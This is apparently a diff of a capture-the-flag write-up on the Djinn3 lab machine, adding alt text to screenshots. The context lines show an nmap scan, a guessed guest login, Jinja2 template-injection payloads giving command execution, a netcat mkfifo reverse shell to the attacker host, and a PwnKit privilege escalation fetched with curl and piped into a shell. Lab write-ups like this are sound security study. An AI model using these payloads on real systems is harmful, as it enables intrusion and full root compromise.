@@ -35,51 +35,51 @@ nmap -A -p- TARGET -oN djinn.nmap --min-rate 10000
 | 5000     | http        |
 | 31337    | unknown     |
 
-![](https://cdn.ziomsec.com/djinn3/1.webp)
+![performing an nmap scan on djinn3 machine](https://cdn.ziomsec.com/djinn3/1.webp)
 
-![](https://cdn.ziomsec.com/djinn3/2.webp)
+![performing an nmap scan on djinn3 machine](https://cdn.ziomsec.com/djinn3/2.webp)
 
 ## Foothold
 
 The **nmap** scan revealed 4 open ports running different services. I started of with the http server running on port 80 and accessed it on my browser.
 
-![](https://cdn.ziomsec.com/djinn3/3.webp)
+![accessing the web application](https://cdn.ziomsec.com/djinn3/3.webp)
 
 I then accessed the server running on port 5000. This page contained hyperlinks and some interesting information about a ticketing system.
 
-![](https://cdn.ziomsec.com/djinn3/4.webp)
+![accessing the service running on port 5000](https://cdn.ziomsec.com/djinn3/4.webp)
 
 I tried accessing port 31337 on the browser but couldn't do so. So I tried accessing it with **nc**. 
 
-![](https://cdn.ziomsec.com/djinn3/5.webp)
+![accessing port 31337 via browser](https://cdn.ziomsec.com/djinn3/5.webp)
 
 ```shell
 nc TARGET 31337
 ```
 
-![](https://cdn.ziomsec.com/djinn3/6.webp)
+![connecting to port 31337 using netcat](https://cdn.ziomsec.com/djinn3/6.webp)
 
 I tried some common credentials like admin, user etc but none of them worked. I read the tickets that were present on port 5000 and found something interesting.
 
-![](https://cdn.ziomsec.com/djinn3/7.webp)
+![reading the tickets on port 5000](https://cdn.ziomsec.com/djinn3/7.webp)
 
-![](https://cdn.ziomsec.com/djinn3/8.webp)
+![reading the tickets on port 5000](https://cdn.ziomsec.com/djinn3/8.webp)
 
 These tickets revealed possible usernames. I tried multiple usernames with common password and ultimately got in using **`guest:guest`**.
 
-![](https://cdn.ziomsec.com/djinn3/9.webp)
+![logging in as guest](https://cdn.ziomsec.com/djinn3/9.webp)
 
 This looked like an API that allowed us to work with the tickets that were present on port 5000.
 
-![](https://cdn.ziomsec.com/djinn3/10.webp)
+![running api commands](https://cdn.ziomsec.com/djinn3/10.webp)
 
 I tried adding a ticket and found it on the server hosted on port 5000.
 
-![](https://cdn.ziomsec.com/djinn3/11.webp)
+![verifying uploaded ticket](https://cdn.ziomsec.com/djinn3/11.webp)
 
 Even its structure remained the same throughout.
 
-![](https://cdn.ziomsec.com/djinn3/12.webp)
+![verifying uploaded ticket](https://cdn.ziomsec.com/djinn3/12.webp)
 
 From this, I was able to assume that the api sent the title and description to the backend which was then inserted in a template. Also, the **nmap** scan revealed port 5000 was running **werkzeug** which is a module used with **flask**. **Flask** servers are infamous for being vulnerable to **SSTI** (Server Side Template Injections).
 
@@ -91,9 +91,9 @@ Title: tempinj
 Description: {{ 7*7 }}
 ```
 
-![](https://cdn.ziomsec.com/djinn3/13.webp)
+![testing ssti](https://cdn.ziomsec.com/djinn3/13.webp)
 
-![](https://cdn.ziomsec.com/djinn3/14.webp)
+![testing ssti](https://cdn.ziomsec.com/djinn3/14.webp)
 
 The server executed the command, which confirmed the presence of **SSTI** vulnerability.  Since flask by default uses **jinja2**, I tried a payload specific to that template engine to see if it works.
 
@@ -101,13 +101,13 @@ The server executed the command, which confirmed the presence of **SSTI** vulner
 {{ ''.__class__.__mro__[1].__subclasses__() }}
 ```
 
-![](https://cdn.ziomsec.com/djinn3/15.webp)
+![adding payload](https://cdn.ziomsec.com/djinn3/15.webp)
 
-![](https://cdn.ziomsec.com/djinn3/16.webp)
+![verifying payload](https://cdn.ziomsec.com/djinn3/16.webp)
 
 It worked. So I went to **hacktricks** to look for ways to get RCE and found this payload.
 
-![](https://cdn.ziomsec.com/djinn3/17.webp)
+![hacktricks ssti rce page](https://cdn.ziomsec.com/djinn3/17.webp)
 
 I tried executing the payload first to see if it worked. If it did, I could attempt to get a reverse shell.
 
@@ -115,9 +115,9 @@ I tried executing the payload first to see if it worked. If it did, I could atte
 {{ cycler.__init__.__globals__.os.popen('id').read() }}
 ```
 
-![](https://cdn.ziomsec.com/djinn3/18.webp)
+![running shell commands via ssti](https://cdn.ziomsec.com/djinn3/18.webp)
 
-![](https://cdn.ziomsec.com/djinn3/19.webp)
+![running shell commands via ssti](https://cdn.ziomsec.com/djinn3/19.webp)
 
 The payload was able to execute commands on the server. Hence I used **netcat** **mkfifo** payload to get a reverse shell.
 
@@ -125,19 +125,19 @@ The payload was able to execute commands on the server. Hence I used **netcat** 
 {{ cycler.__init__.__globals__.os.popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc KALI PORT > /tmp/f').read() }}
 ```
 
-![](https://cdn.ziomsec.com/djinn3/20.webp)
+![configuring reverse shell](https://cdn.ziomsec.com/djinn3/20.webp)
 
 I opened another ticket with my reverse shell payload and started a listener on another terminal.
 
-![](https://cdn.ziomsec.com/djinn3/21.webp)
+![uploading reverse shell](https://cdn.ziomsec.com/djinn3/21.webp)
 
 Upon visiting the page, I got a reverse shell.
 
-![](https://cdn.ziomsec.com/djinn3/22.webp)
+![getting reverse shell connection from the server](https://cdn.ziomsec.com/djinn3/22.webp)
 
 I then found the first flag inside **`/var/www`**.
 
-![](https://cdn.ziomsec.com/djinn3/23.webp)
+![capturing the user flag](https://cdn.ziomsec.com/djinn3/23.webp)
 
 ## Privilege Escalation
 
@@ -147,13 +147,13 @@ I looked for binaries with uncommon suid bit sets and found **pkexec**
 find / -user root -perm -u=s -ls 2>/dev/null
 ```
 
-![](https://cdn.ziomsec.com/djinn3/24.webp)
+![searching suid bits](https://cdn.ziomsec.com/djinn3/24.webp)
 
 When **pkexec** has an **suid bit set**, we can try to escalate our privilege using the PwnKit method. I googled for the exploit and found the github repo.
 
-![](https://cdn.ziomsec.com/djinn3/25.webp)
+![searching exploits for pkexec](https://cdn.ziomsec.com/djinn3/25.webp)
 
-![](https://cdn.ziomsec.com/djinn3/26.webp)
+![searching exploits for pkexec](https://cdn.ziomsec.com/djinn3/26.webp)
 
 I downloaded the script on my local machine and then started a python server so that I could transfer it to the target.
 
@@ -162,21 +162,21 @@ wget "https://raw.githubusercontent.com/ly4k/PwnKit/refs/heads/main/PwnKit.sh"
 python3 -m http.server 8080
 ```
 
-![](https://cdn.ziomsec.com/djinn3/27.webp)
+![transfering exploit to the target](https://cdn.ziomsec.com/djinn3/27.webp)
 
 I followed the instructions that were provided on the **github** repo.
 
-![](https://cdn.ziomsec.com/djinn3/28.webp)
+![instructions to run the exploit](https://cdn.ziomsec.com/djinn3/28.webp)
 
 ```shell
 sh -c "$(curl -fsSL http://KALI:8080/PwnKit.sh)"
 ```
 
-![](https://cdn.ziomsec.com/djinn3/29.webp)
+![downloading the exploit on the target server](https://cdn.ziomsec.com/djinn3/29.webp)
 
 After getting the root shell, I captured the final flag from the **`/root`** directory.
 
-![](https://cdn.ziomsec.com/djinn3/30.webp)
+![capturing the root flag](https://cdn.ziomsec.com/djinn3/30.webp)
 
 ## Closure
 
